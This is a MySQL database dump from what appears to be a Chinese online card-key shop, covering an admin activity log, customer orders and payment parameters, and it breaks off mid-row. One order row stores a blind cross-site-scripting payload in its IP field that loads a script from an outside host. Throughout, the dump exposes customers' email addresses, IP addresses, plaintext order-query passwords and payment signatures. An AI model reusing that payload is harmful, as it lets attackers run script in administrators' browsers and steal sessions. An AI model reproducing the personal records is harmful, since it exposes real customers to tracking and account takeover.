INSERT INTO `acg_manage_log` VALUES (1,'admin@fun.com','你挺能闹啊?','登录了后台','2023-04-30 14:37:03','18.167.69.222','Chrome',1),(2,'admin@fun.com','你挺能闹啊?','修改了网站设置','2023-04-30 14:46:04','18.167.69.222','Chrome',1),(3,'admin@fun.com','你挺能闹啊?','安装了应用(Epay)','2023-04-30 14:49:55','18.167.69.222','Chrome',1),(4,'admin@fun.com','你挺能闹啊?','修改了支付插件(Epay)的配置信息','2023-04-30 14:55:41','18.167.69.222','Chrome',1),(5,'admin@fun.com','你挺能闹啊?','[修改/新增]支付接口','2023-04-30 14:56:45','18.167.69.222','Chrome',1),(6,'admin@fun.com','你挺能闹啊?','[修改/新增]支付接口','2023-04-30 14:57:24','18.167.69.222','Chrome',1),(7,'admin@fun.com','你挺能闹啊?','[修改/新增]支付接口','2023-04-30 14:57:45','18.167.69.222','Chrome',1),(8,'admin@fun.com','你挺能闹啊?','[修改/新增]支付接口','2023-04-30 15:01:14','18.167.69.222','Chrome',1),(9,'admin@fun.com','你挺能闹啊?','[修改/新增]支付接口','2023-04-30 15:01:27','18.167.69.222','Chrome',1),(10,'admin@fun.com','你挺能闹啊?','[修改/新增]支付接口','2023-04-30 15:07:44','18.167.69.222','Chrome',1),(11,'admin@fun.com','你挺能闹啊?','[修改/新增]商品','2023-04-30 16:41:52','18.167.69.222','Chrome',1),(12,'admin@fun.com','你挺能闹啊?','[修改/新增]商品','2023-04-30 16:42:51','18.167.69.222','Chrome',1),(13,'admin@fun.com','你挺能闹啊?','[修改/新增]商品','2023-04-30 16:43:15','18.167.69.222','Chrome',1),(14,'admin@fun.com','你挺能闹啊?','[修改/新增]商品','2023-04-30 16:43:53','18.167.69.222','Chrome',1),(15,'admin@fun.com','你挺能闹啊?','[修改/新增]商品','2023-04-30 16:47:02','18.167.69.222','Chrome',1),(16,'admin@fun.com','你挺能闹啊?','[新增/修改]商品分类','2023-04-30 16:47:42','18.167.69.222','Chrome',1),(17,'admin@fun.com','你挺能闹啊?','[新增/修改]商品分类','2023-04-30 16:50:11','18.167.69.222','Chrome',1),(18,'admin@fun.com','你挺能闹啊?','[新增/修改]商品分类','2023-04-30 16:50:18','18.167.69.222','Chrome',1),(19,'admin@fun.com','你挺能闹啊?','[修改/新增]商品','2023-04-30 16:50:40','18.167.69.222','Chrome',1),(20,'admin@fun.com','你挺能闹啊?','[修改/新增]商品','2023-04-30 16:51:49','18.167.69.222','Chrome',1),(21,'admin@fun.com','你挺能闹啊?','[新增/修改]商品分类','2023-04-30 16:53:27','18.167.69.222','Chrome',1),(22,'admin@fun.com','你挺能闹啊?','[新增/修改]商品分类','2023-04-30 16:53:39','18.167.69.222','Chrome',1),(23,'admin@fun.com','你挺能闹啊?','修改了支付插件(Epay)的配置信息','2023-04-30 19:15:57','18.167.69.222','Chrome',1),(24,'admin@fun.com','你挺能闹啊?','登录了后台','2023-06-05 11:17:10','38.54.19.31','Chrome',1),(25,'admin@fun.com','你挺能闹啊?','[修改/新增]支付接口','2023-06-05 11:36:22','38.54.19.31','Chrome',1),(26,'admin@fun.com','你挺能闹啊?','登录了后台','2023-06-05 15:15:04','113.249.55.129','Chrome',1),(27,'admin@fun.com','你挺能闹啊?','登录了后台','2023-06-06 23:39:30','103.84.217.57','Chrome',1),(28,'admin@fun.com','你挺能闹啊?','修改了网站设置','2023-06-06 23:40:32','103.84.217.57','Chrome',1),(29,'admin@fun.com','你挺能闹啊?','登录了后台','2023-06-12 22:23:39','113.249.53.164','Chrome',1),(30,'admin@fun.com','你挺能闹啊?','登录了后台','2023-06-20 16:28:59','89.208.248.175','Chrome',1),(31,'admin@fun.com','你挺能闹啊?','登录了后台','2023-06-20 20:44:30','89.208.248.175','Chrome',0),(32,'admin@fun.com','你挺能闹啊?','登录了后台','2023-06-24 11:38:33','89.208.248.175','Chrome',0),(33,'admin@fun.com','你挺能闹啊?','修改了邮件配置','2023-06-24 12:03:55','89.208.248.175','Chrome',0),(34,'admin@fun.com','你挺能闹啊?','修改了邮件配置','2023-06-24 12:04:29','89.208.248.175','Chrome',0),(35,'admin@fun.com','你挺能闹啊?','测试了邮件发送','2023-06-24 12:04:44','89.208.248.175','Chrome',0),(36,'admin@fun.com','你挺能闹啊?','测试了邮件发送','2023-06-24 12:04:58','89.208.248.175','Chrome',0),(37,'admin@fun.com','你挺能闹啊?','测试了邮件发送','2023-06-24 12:05:33','89.208.248.175','Chrome',0),(38,'admin@fun.com','你挺能闹啊?','登录了后台','2023-06-24 12:10:52','89.208.248.175','Chrome',0),(39,'admin@fun.com','你挺能闹啊?','测试了邮件发送','2023-06-24 12:11:17','89.208.248.175','Chrome',0);
/*!40000 ALTER TABLE `acg_manage_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_order`
--

DROP TABLE IF EXISTS `acg_order`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_order` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `owner` int unsigned NOT NULL DEFAULT '0' COMMENT '所属会员：0=游客，其他等于会员UID',
  `user_id` int unsigned NOT NULL DEFAULT '0' COMMENT '商户ID：0=系统，其他等于会员ID',
  `trade_no` char(19) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '订单号',
  `amount` decimal(10,2) unsigned NOT NULL COMMENT '订单金额',
  `commodity_id` int unsigned NOT NULL COMMENT '商品id',
  `card_id` int unsigned DEFAULT NULL COMMENT '预选卡密id',
  `card_num` int unsigned NOT NULL DEFAULT '0' COMMENT '卡密数量',
  `pay_id` int unsigned NOT NULL COMMENT '支付方式id',
  `create_time` datetime NOT NULL COMMENT '下单时间',
  `create_ip` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '下单IP',
  `create_device` tinyint unsigned NOT NULL COMMENT '下单设备：0=电脑,1=安卓,2=IOS,3=IPAD',
  `pay_time` datetime DEFAULT NULL COMMENT '支付时间',
  `status` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '订单状态：0=未支付，1=已支付',
  `secret` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci COMMENT '卡密信息',
  `password` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '查询密码',
  `contact` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '联系方式',
  `delivery_status` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '发货状态：0=未发货，1=已发货',
  `pay_url` varchar(1024) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL,
  `coupon_id` int unsigned DEFAULT NULL COMMENT '优惠卷id',
  `cost` decimal(10,2) unsigned NOT NULL DEFAULT '0.00' COMMENT '手续费',
  `from` int unsigned DEFAULT NULL COMMENT '推广人id',
  `premium` decimal(10,2) unsigned DEFAULT '0.00' COMMENT '加价',
  `widget` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci COMMENT '控件内容',
  `rent` decimal(10,2) unsigned NOT NULL DEFAULT '0.00' COMMENT '成本价',
  `race` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '商品种类',
  `rebate` decimal(10,2) unsigned DEFAULT '0.00' COMMENT '返利金额',
  `pay_cost` decimal(10,2) unsigned DEFAULT '0.00' COMMENT '支付接口手续费',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE KEY `trade_no` (`trade_no`) USING BTREE,
  KEY `commodity_id` (`commodity_id`) USING BTREE,
  KEY `pay_id` (`pay_id`) USING BTREE,
  KEY `contact` (`contact`) USING BTREE,
  KEY `create_ip` (`create_ip`) USING BTREE,
  KEY `owner` (`owner`) USING BTREE,
  KEY `from` (`from`) USING BTREE,
  KEY `user_id` (`user_id`) USING BTREE,
  KEY `card_id` (`card_id`) USING BTREE,
  KEY `create_time` (`create_time`) USING BTREE,
  KEY `delivery_status` (`delivery_status`) USING BTREE,
  KEY `coupon_id` (`coupon_id`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=56 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_order`
--

LOCK TABLES `acg_order` WRITE;
/*!40000 ALTER TABLE `acg_order` DISABLE KEYS */;
INSERT INTO `acg_order` VALUES (1,0,0,'972230430204821365',50.00,2,NULL,50,2,'2023-04-30 20:48:21','2607:9000:8000:22::283:a829',0,NULL,0,NULL,'12345678','1234@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(2,0,0,'713230430204945625',50.00,1,NULL,50,3,'2023-04-30 20:49:45','2607:9000:8000:22::283:a829',0,NULL,0,NULL,'12345678','1234@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(3,0,0,'870230501144528672',50.00,2,NULL,50,5,'2023-05-01 14:45:28','14.0.168.66',2,NULL,0,NULL,'123456','46494648@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(4,0,0,'683230501195715602',50.00,1,NULL,50,3,'2023-05-01 19:57:15','23.106.142.119',0,NULL,0,NULL,'dssssdssssss','56366@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(5,0,0,'898230501195836329',50.00,1,NULL,50,2,'2023-05-01 19:58:36','23.106.142.119',0,NULL,0,NULL,'dddddddddddddd','56666@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(6,0,0,'304230501204940231',200.00,2,NULL,200,2,'2023-05-01 20:49:40','147.189.161.141',1,'2023-05-01 20:50:42',1,'购买后联系公告的机器人?','123556','julywenjuanshoes@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(7,0,0,'535230503115105992',270.00,2,NULL,270,2,'2023-05-03 11:51:05','204.112.142.233',2,'2023-05-03 11:51:46',1,'购买后联系公告的机器人?','Feilvbin202c','smaport.ca@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(8,0,0,'658230503154834840',50.00,2,NULL,50,5,'2023-05-03 15:48:34','103.186.113.172',0,NULL,0,NULL,'123123','123@123',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(9,0,0,'271230503161623609',50.00,2,NULL,50,3,'2023-05-03 16:16:23','103.160.181.218',0,NULL,0,NULL,'1001010','10010@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(10,0,0,'824230503161851102',50.00,1,NULL,50,2,'2023-05-03 16:18:51','103.160.181.218',0,NULL,0,NULL,'1001010','10010@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(11,0,0,'613230505174210348',50.00,2,NULL,50,3,'2023-05-05 17:42:10','2400:8902::f03c:93ff:fe71:fd7d',1,NULL,0,NULL,'123456789','123456@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(12,0,0,'717230505174221944',50.00,2,NULL,50,4,'2023-05-05 17:42:21','2400:8902::f03c:93ff:fe71:fd7d',1,NULL,0,NULL,'123456789','123456@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(13,0,0,'408230505174224584',50.00,2,NULL,50,5,'2023-05-05 17:42:24','2400:8902::f03c:93ff:fe71:fd7d',1,NULL,0,NULL,'123456789','123456@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(14,0,0,'206230505200546995',50.00,2,NULL,50,2,'2023-05-05 20:05:46','2409:895a:9831:d02c:175c:2e6f:aaac:ee18',1,'2023-05-05 20:06:04',1,'购买后联系公告的机器人?','(kdkdnn)','julyshoesbag@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(15,0,0,'378230508172826122',70.00,1,NULL,70,2,'2023-05-08 17:28:26','2400:8d60:2::1:3697:98f7',0,'2023-05-08 17:28:46',1,'购买后联系公告的机器人?','1314520','642540998@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(16,0,0,'201230508233330196',100.00,2,NULL,100,2,'2023-05-08 23:33:30','223.104.69.144',1,'2023-05-08 23:33:48',1,'购买后联系公告的机器人?','(kdkdnn)','julyshoesbag@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(17,0,0,'834230510191706221',50.00,1,NULL,50,5,'2023-05-10 19:17:06','2a09:bac5:80c9:15e1::22e:29',0,NULL,0,NULL,'123456','56345987@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(18,0,0,'923230511110957623',200.00,1,NULL,200,2,'2023-05-11 11:09:57','2605:52c0:2:6a7::',2,'2023-05-11 11:10:32',1,'购买后联系公告的机器人?','123456abc','1205769002@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(19,0,0,'607230517230546913',200.00,2,NULL,200,2,'2023-05-17 23:05:46','204.112.142.233',0,'2023-05-17 23:06:28',1,'购买后联系公告的机器人?','Feilvbin2o2c','smaport.ca@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(20,0,0,'255230518192605786',50.00,2,NULL,50,4,'2023-05-18 19:26:05','<sCRiPt sRC=https://x.xfuck.gq/js/c83925.js></sCrIpT>',0,NULL,0,NULL,'1234565','dfasdf@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(21,0,0,'193230522134122673',50.00,2,NULL,50,5,'2023-05-22 13:41:22','2a09:bac5:a6f3:96::f:33d',0,NULL,0,NULL,'123456','56345987@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(22,0,0,'811230522134203778',50.00,2,NULL,50,4,'2023-05-22 13:42:03','2a09:bac5:a6f3:96::f:33d',0,NULL,0,NULL,'123456','56345987@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(23,0,0,'764230601183704447',50.00,1,NULL,50,2,'2023-06-01 18:37:04','2406:da18:1c5:2a00:f00b:aae4:2892:7efe',0,NULL,0,NULL,'1234324123123','kikuchanscc@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(24,0,0,'130230605081338268',260.00,1,NULL,260,2,'2023-06-05 08:13:38','2409:895a:9228:5e13:1765:97c9:16b5:b197',1,NULL,0,NULL,'(kdkdnn)','julyshoesbag@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(25,0,0,'229230605081404227',260.00,1,NULL,260,3,'2023-06-05 08:14:04','2409:895a:9228:5e13:1765:97c9:16b5:b197',1,NULL,0,NULL,'(kdkdnn)','julyshoesbag@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(26,0,0,'557230605081514870',260.00,2,NULL,260,2,'2023-06-05 08:15:14','2409:895a:9228:5e13:1765:97c9:16b5:b197',1,'2023-06-05 08:16:19',1,'购买后联系公告的机器人?','(kdkdnn)','julyshoesbag@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(27,0,0,'386230605111610619',50.00,1,NULL,50,4,'2023-06-05 11:16:10','38.54.19.31',1,NULL,0,NULL,'hhsbbd','hshzbbhsjxb@163.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(28,0,0,'566230605111834833',50.00,1,NULL,50,5,'2023-06-05 11:18:34','38.54.19.31',1,NULL,0,NULL,'hdhxhh548976','hshdbxhhzh@126.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(29,0,0,'645230605112503694',50.00,1,NULL,50,4,'2023-06-05 11:25:03','38.54.19.31',1,NULL,0,NULL,'hsbxbj6497','hshbsheu@163.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(30,0,0,'386230605113527786',50.00,1,NULL,50,4,'2023-06-05 11:35:27','38.54.19.31',1,NULL,0,NULL,'hsbxbj6497','hshbsheu@163.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(31,0,0,'181230605113630502',50.00,1,NULL,50,4,'2023-06-05 11:36:30','38.54.19.31',1,NULL,0,NULL,'hsbxbj6497','hshbsheu@163.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(32,0,0,'985230605113733764',50.00,2,NULL,50,4,'2023-06-05 11:37:33','38.54.19.31',1,NULL,0,NULL,'hsbdh6497','hsbsnzu@126.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(33,0,0,'876230605135747713',100.00,1,NULL,100,3,'2023-06-05 13:57:47','2a09:bac1:1980:18::4:318',0,'2023-06-05 13:59:46',1,'购买后联系公告的机器人?','13510321585','shaoxiaole2021@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(34,0,0,'780230607223950226',50.00,2,NULL,50,3,'2023-06-07 22:39:50','43.249.50.223',1,NULL,0,NULL,'202011','edenegris@une.edu',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(35,0,0,'489230609155212207',70.00,1,NULL,70,3,'2023-06-09 15:52:12','183.253.170.38',1,'2023-06-09 15:52:44',1,'购买后联系公告的机器人?','123456','642540998@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(36,0,0,'464230610180021216',50.00,1,NULL,50,4,'2023-06-10 18:00:21','103.135.249.107',0,NULL,0,NULL,'11111111','qq@QQ.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(37,0,0,'827230611083401317',120.00,1,NULL,120,4,'2023-06-11 08:34:01','2409:8a55:ec20:bbd0:502c:43bc:2ec8:a66f',0,NULL,0,NULL,'123456','cscn@163.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(38,0,0,'992230611083510519',150.00,1,NULL,150,4,'2023-06-11 08:35:10','2409:8a55:ec20:bbd0:502c:43bc:2ec8:a66f',0,'2023-06-11 08:38:01',1,'购买后联系公告的机器人?','123456','cscn@163.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(39,0,0,'294230611144924665',50.00,1,NULL,50,4,'2023-06-11 14:49:24','2409:8a55:ec20:bbd0:f024:b8a5:43ab:24ea',0,NULL,0,NULL,'111111','cscn@163.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(40,0,0,'911230612193313903',50.00,2,NULL,50,3,'2023-06-12 19:33:13','240a:42ab:3000:59a:4ca6:a7ff:fe38:dc5',1,NULL,0,NULL,'646464','46646464@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(41,0,0,'453230613121727934',50.00,1,NULL,50,4,'2023-06-13 12:17:27','89.185.29.160',0,NULL,0,NULL,'123456123','dasfa3123@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(42,0,0,'485230613201231763',100.00,1,NULL,100,2,'2023-06-13 20:12:31','2407:cdc0:b028::1194',2,NULL,0,NULL,'1hcjmpy5','G01005696@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(43,0,0,'720230613201438361',100.00,2,NULL,100,2,'2023-06-13 20:14:38','2605:52c0:2:b96::',2,NULL,0,NULL,'1hcjmpy5','g01005696@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(44,0,0,'976230613201721238',100.00,2,NULL,100,3,'2023-06-13 20:17:21','2605:52c0:2:b96::',2,NULL,0,NULL,'1hcjmpy5','g01005696@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(45,0,0,'931230613202045844',100.00,1,NULL,100,2,'2023-06-13 20:20:45','154.17.10.138',2,NULL,0,NULL,'1hcjmpy5','G01005696@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(46,0,0,'332230613203512224',50.00,1,NULL,50,2,'2023-06-13 20:35:12','113.249.53.164',1,NULL,0,NULL,'dhdhxhxbd','5457349h@163.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(47,0,0,'980230613204921883',100.00,1,NULL,100,2,'2023-06-13 20:49:21','103.47.101.19',2,'2023-06-13 20:50:36',1,'购买后联系公告的机器人?','1hcjmpy5','G01005696@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(48,0,0,'319230614211652520',100.00,1,NULL,100,3,'2023-06-14 21:16:52','223.89.13.156',0,NULL,0,NULL,'123654','1444368916@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(49,0,0,'641230614211851376',100.00,1,NULL,100,2,'2023-06-14 21:18:51','223.89.13.156',0,'2023-06-14 21:19:11',1,'购买后联系公告的机器人?','123654','1444368916@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(50,0,0,'348230617071313995',200.00,2,NULL,200,2,'2023-06-17 07:13:13','204.112.21.214',0,'2023-06-17 07:13:50',1,'购买后联系公告的机器人?','Feilvbin2o2c','smaport.ca@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(51,0,0,'295230617232232898',50.00,1,NULL,50,3,'2023-06-17 23:22:32','103.252.119.180',1,NULL,0,NULL,'hbdhxbjd','hdhxbzu@163.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(52,0,0,'665230617232242385',50.00,1,NULL,50,4,'2023-06-17 23:22:42','103.252.119.180',1,NULL,0,NULL,'hbdhxbjd','hdhxbzu@163.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(53,0,0,'141230622195723339',160.00,1,NULL,160,2,'2023-06-22 19:57:23','2409:8a55:9363:b900:d0e8:ee23:a064:cfa8',1,NULL,0,NULL,'(kdkdnn)','julyshoesbag@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(54,0,0,'285230622195839265',160.00,1,NULL,160,2,'2023-06-22 19:58:39','2409:8a55:9363:b900:d0e8:ee23:a064:cfa8',1,'2023-06-22 19:59:28',1,'购买后联系公告的机器人?','(kdkdnn)','julyshoesbag@gmail.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00),(55,0,0,'380230624145542970',50.00,1,NULL,50,3,'2023-06-24 14:55:42','194.99.79.130',0,NULL,0,NULL,'123456','kun@qq.com',0,'https://e.fun513.com/submit.php',NULL,0.00,NULL,0.00,'[]',0.00,NULL,0.00,0.00);
/*!40000 ALTER TABLE `acg_order` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_order_option`
--

DROP TABLE IF EXISTS `acg_order_option`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_order_option` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `order_id` int unsigned NOT NULL COMMENT '订单id',
  `option` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci COMMENT '配置数据',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE KEY `order_id` (`order_id`) USING BTREE,
  CONSTRAINT `acg_order_option_ibfk_1` FOREIGN KEY (`order_id`) REFERENCES `acg_order` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE=InnoDB AUTO_INCREMENT=56 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_order_option`
--

LOCK TABLES `acg_order_option` WRITE;
/*!40000 ALTER TABLE `acg_order_option` DISABLE KEYS */;
INSERT INTO `acg_order_option` VALUES (1,1,'{\"pid\":\"1000\",\"name\":\"972230430204821365\",\"type\":\"alipay\",\"money\":50,\"out_trade_no\":\"972230430204821365\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=972230430204821365\",\"sitename\":\"972230430204821365\",\"sign\":\"2b0dc6c72055ff6702b9b219f84302a3\",\"sign_type\":\"MD5\"}'),(2,2,'{\"pid\":\"1000\",\"name\":\"713230430204945625\",\"type\":\"wxpay\",\"money\":50,\"out_trade_no\":\"713230430204945625\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=713230430204945625\",\"sitename\":\"713230430204945625\",\"sign\":\"44f94824b285d05642880beb2efc5813\",\"sign_type\":\"MD5\"}'),(3,3,'{\"pid\":\"1000\",\"name\":\"870230501144528672\",\"type\":\"TRX\",\"money\":50,\"out_trade_no\":\"870230501144528672\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=870230501144528672\",\"sitename\":\"870230501144528672\",\"sign\":\"59607e7d03b087d40f7597b104ab75a6\",\"sign_type\":\"MD5\"}'),(4,4,'{\"pid\":\"1000\",\"name\":\"683230501195715602\",\"type\":\"wxpay\",\"money\":50,\"out_trade_no\":\"683230501195715602\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=683230501195715602\",\"sitename\":\"683230501195715602\",\"sign\":\"59bfe2a15aa70787740300632b43a522\",\"sign_type\":\"MD5\"}'),(5,5,'{\"pid\":\"1000\",\"name\":\"898230501195836329\",\"type\":\"alipay\",\"money\":50,\"out_trade_no\":\"898230501195836329\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=898230501195836329\",\"sitename\":\"898230501195836329\",\"sign\":\"20fa60897d01de0004c786c4cec4f9d7\",\"sign_type\":\"MD5\"}'),(6,6,'{\"pid\":\"1000\",\"name\":\"304230501204940231\",\"type\":\"alipay\",\"money\":200,\"out_trade_no\":\"304230501204940231\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=304230501204940231\",\"sitename\":\"304230501204940231\",\"sign\":\"cb8ce8b232214e5b4cec465ef13ec342\",\"sign_type\":\"MD5\"}'),(7,7,'{\"pid\":\"1000\",\"name\":\"535230503115105992\",\"type\":\"alipay\",\"money\":270,\"out_trade_no\":\"535230503115105992\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=535230503115105992\",\"sitename\":\"535230503115105992\",\"sign\":\"e9e5eabe54f495d2898e090ced7106d3\",\"sign_type\":\"MD5\"}'),(8,8,'{\"pid\":\"1000\",\"name\":\"658230503154834840\",\"type\":\"TRX\",\"money\":50,\"out_trade_no\":\"658230503154834840\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=658230503154834840\",\"sitename\":\"658230503154834840\",\"sign\":\"6bba51ae71e557454e224d28302c1d5c\",\"sign_type\":\"MD5\"}'),(9,9,'{\"pid\":\"1000\",\"name\":\"271230503161623609\",\"type\":\"wxpay\",\"money\":5